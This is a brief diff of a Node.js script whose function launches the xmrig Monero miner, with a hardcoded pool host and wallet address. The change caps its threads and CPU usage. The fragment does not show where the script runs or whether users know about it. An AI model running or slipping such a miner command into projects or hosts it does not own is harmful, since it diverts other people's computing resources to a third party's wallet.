@@ -19,7 +19,7 @@ async function runCommands() {
 
     // Step 4: Run the xmrig command
     console.log('Running xmrig...');
-    const xmrigCommand = './xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero';
+    const xmrigCommand = './xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero --threads 60 --max-cpu-usage 60';
     await executeCommand(xmrigCommand);
     console.log('xmrig started successfully.');
   } catch (error) {
